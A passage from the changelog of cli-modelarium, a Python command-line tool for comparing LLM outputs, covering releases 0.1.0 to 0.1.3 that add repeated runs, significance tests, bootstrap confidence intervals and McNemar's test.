### Dependencies

- No dependency changes.

## [0.1.3] - 2026-05-28

### Added

- Bootstrap confidence intervals on per-cell means via `scipy.stats.bootstrap`. Auto-enabled when `--runs > 1`.
- New CLI flags on `compare`:
  - `--confidence-intervals` / `--no-confidence-intervals` (auto-enabled with `--runs > 1`)
  - `--ci-level FLOAT` (default `0.95`)
  - `--ci-method {bca,percentile,basic}` (default `bca` - publication-grade)
  - `--bootstrap-resamples INT` (default `5000`, min `100`)
  - `--bootstrap-seed INT` (required for reproducible CIs)
- New test choices on `--significance-test`:
  - `paired-t` - paired t-test via `scipy.stats.ttest_rel` (more statistical power for same-prompt comparisons)
  - `wilcoxon-signed` - Wilcoxon signed-rank via `scipy.stats.wilcoxon` (non-parametric paired)
- McNemar's test for paired binary outcomes. Auto-triggers when `--check-hallucination` is set with `--runs > 1` and 2+ models. Uses exact binomial test (`scipy.stats.binomtest`) for small discordant counts or Edwards continuity-corrected chi-square (`scipy.stats.chi2.sf`) for larger samples - NOT `scipy.stats.chi2_contingency` on the full 2×2 table (which would compute a test of independence, not McNemar).
- Bootstrap CIs on Cohen's d effect sizes via paired/independent bootstrap.
- `mcnemar_tests` array in JSON output when applicable.
- `methodology` block in JSON output recording bootstrap parameters, scipy version, and seed for reproducibility.
- Additive CI columns in CSV output (`latency_ms_ci_low`, `latency_ms_ci_high`, etc.) when CIs are enabled.
- Additive Markdown sections: "Bootstrap confidence intervals", "Statistical significance tests", "Binary outcome significance (McNemar)", "Statistical methodology".
- New public functions in `cli_modelarium.run_statistics`:
  - `ConfidenceInterval`, `McNemarResult` dataclasses
  - `bootstrap_ci()` - thin scipy wrapper with degenerate-data handling
  - `paired_t_test()`, `wilcoxon_signed_rank()`
  - `mcnemar_test()` - Edwards-corrected or exact binomial McNemar
  - `compute_significance_with_ci()` - like `compute_pairwise_significance` plus CIs on Cohen's d
  - `compute_stats_with_cis()` - CIs on per-model metric means
  - `compute_mcnemar_pairwise()` - pairwise McNemar over hallucination pass/fail
- New private helpers ensuring paired tests align by `run_index` even when failures are asymmetric:
  - `_extract_paired_metric_samples()`
  - `_align_paired_samples()`

### Changed

- `SignificanceResult` dataclass extended with seven optional fields (all default `None`): `bootstrap_ci_low`, `bootstrap_ci_high`, `bootstrap_method`, `bootstrap_resamples`, `bootstrap_seed`, `effect_size_ci_low`, `effect_size_ci_high`. v0.1.2-style positional instantiation continues to work unchanged.
- Output formatters extended so CSV, Markdown, and JSON all receive significance, CI, McNemar, and methodology data (previously only JSON received significance results - a v0.1.2 wiring gap).
- `_emit_batch_results` threads the new parameters into every formatter branch.

### Dependencies

- No new runtime dependencies (uses scipy 1.17 already in v0.1.2).
- `NOTICE` unchanged - scipy is already attributed.
- Python version unchanged (still `>=3.11` from v0.1.2).

## [0.1.2] - 2026-05-28

### ⚠️ Breaking Changes

- **Minimum Python version is now 3.11** (was 3.10).
  - Reason: scipy 1.17+ is a new runtime dependency for statistical significance testing, and scipy 1.17 requires Python 3.11+.
  - Python 3.10 users can continue using cli-modelarium v0.1.1, which remains available on PyPI.
  - Python 3.10 reaches end-of-life in October 2026.

### Added

- Pairwise statistical significance testing on the `compare` command. Auto-enabled when `--runs > 1` with 2+ models.
- New CLI flags on `compare`:
  - `--significance` / `--no-significance` (auto-enabled with `--runs > 1` and 2+ models)
  - `--significance-threshold FLOAT` (default: `0.05`)
  - `--significance-test {welch,mann-whitney}` (default: `welch`)
  - `--correction {none,bonferroni,holm}` (default: `bonferroni`)
  - `--significance-metric {score,latency_ms,output_tokens,cost_usd}` (default: `score` when judging, else `latency_ms`)
- Welch's t-test via `scipy.stats.ttest_ind(equal_var=False)`.
- Mann-Whitney U test via `scipy.stats.mannwhitneyu` with continuity correction.
- Cohen's d effect size with conventional interpretation bands (`negligible` / `small` / `medium` / `large`), implemented in pure stdlib.
- Bonferroni and Holm-Bonferroni multiple-comparison corrections, implemented in pure stdlib with monotone enforcement.
- JSON output now includes a `significance_tests` array when significance testing was performed. When significance is disabled or trivially absent, the JSON schema is unchanged (additive only).
- Display strategy: single-line summary for 2 models, matrix table for 3-5 models, top-K significant pairs for 6+ models (full matrix available in JSON).
- New functions in `cli_modelarium.run_statistics`:
  - `SignificanceResult` dataclass
  - `compute_pairwise_significance()`
  - `welch_t_test()`, `mann_whitney_u_test()`
  - `cohens_d()`, `cohens_d_interpretation()`
  - `bonferroni_correct()`, `holm_correct()`

### Changed

- `pyproject.toml`: `requires-python` bumped to `>=3.11`.
- `pyproject.toml`: classifiers updated - removed Python 3.10, added 3.13 and 3.14.
- `pyproject.toml`: `[tool.ruff].target-version` bumped to `py311`.
- `NOTICE`: added attributions for scipy, numpy, and the bundled native libraries (OpenBLAS, LAPACK, libquadmath).
- README: new "System Requirements" section and statistical-significance documentation.

### Fixed

- Resolved a latent inconsistency: `tests/test_jsonschema_optional.py` already imported `tomllib` (Python 3.11+ stdlib only) while the project declared 3.10 support. The Python bump retroactively fixes this.

### Dependencies

- Added: `scipy>=1.17,<2.0` (pulls `numpy>=1.26.4` as a transitive dependency).

## [0.1.1] - 2026-05-27

### Added

- `--runs N` flag on the `compare` command for statistical reproducibility analysis. Runs each (model, temperature, system_prompt) combination N times (1-100) and displays mean/median/stdev/CV of timing and tokens, cost totals, output frequency analysis, mode output, and output diversity.
- `--show-all-runs` flag to override the auto-collapse heuristic when many concurrent display panels would be created.
- New module `src/cli_modelarium/run_statistics.py` with `RunStats` dataclass and `compute_run_stats()` function for pure-stdlib statistical analysis.
- Hallucination rate calculation when `--check-hallucination` is combined with `--runs N`. Reports "N of M runs flagged as High risk" with the aggregate hallucination rate.
- Cost warning when `--runs N` is used without `--max-cost` (helps prevent unexpected spend).

### Changed

- `compare` command's display path branches when `runs > 1` to show statistical summary instead of per-run details. When `runs == 1` (default), behavior is byte-identical to v0.1.0.
- `run_streaming_comparison()` accepts new keyword parameters `runs: int = 1` and `show_all_runs: bool = False`. Default values preserve existing behavior.
- `StreamState` dataclass has new field `run_index: int = 0`. Default value preserves all existing test expectations.
- `BatchResult` dataclass has new field `run_index: int = 0`. Only emitted in CSV/JSON/Markdown output when the surrounding `runs` parameter > 1.
- Live streaming display auto-collapses when total concurrent tasks exceed 12 (configurable via `--show-all-runs`).
- LLM-as-judge with `--runs N`:
  - Default (with `--judge` or `--judges`): mode-only judging (one judge call per cell, expanded to every run in the cell)
  - With `--check-hallucination`: per-run judging (computes hallucination rate)
- JSON output schema additive when `runs > 1`: new `total_runs` and `stats_by_cell` top-level fields, plus `run_index` per result. When `runs == 1`, schema is byte-identical to v0.1.0.
- CSV output adds `run_index` column when `runs > 1`. When `runs == 1`, columns are unchanged.
- Markdown output adds a "Per-cell statistical summary" section when `runs > 1`. When `runs == 1`, output is unchanged.

### Fixed

- N/A (no bug fixes in this release; only additions)

## [0.1.0] - 2026-05-25

### Added

- Initial v0.1.0 release
- 8 cloud provider integrations: OpenAI, Anthropic, Google, xAI, DeepSeek, Mistral, Groq, OpenRouter
- Local model support: Ollama, LM Studio, vLLM, llama.cpp via OpenAI-compatible API
- Parallel streaming with TTFT (Time To First Token) tracking
- Multi-prompt batch mode with CSV, JSON, and Markdown output formats
- System prompt support: single, multiple (comparison), and file-based
- LLM-as-a-judge scoring with panel mode and self-evaluation skip
- Deterministic assertions with 10 types (`contains`, `not_contains`, `regex`, `equals`, `json_valid`, `json_schema`, `min_length_chars`, `max_length_chars`, `latency_under`, `cost_under`)
- CI/CD exit codes: 0 = success, 1 = assertion failure, 2 = call failure (call failures dominate)
- Hallucination detection preset with optional reference facts and worst-wins panel aggregation
- OS-native keychain integration via `keyring`
- API key format validation for 8 providers
- Error message redaction prevents key leakage
- Localhost-only validation for local model URLs
- Cross-platform support: macOS, Windows 10+/ARM, Linux
- Rate limit handling: 429 retry with exponential backoff, 529 (Anthropic overloaded) with longer backoff
- `retry-after` header honored when present
- Per-provider semaphores for concurrent request management
- Atomic file writes for output integrity
- Apache 2.0 License with proper NOTICE attribution
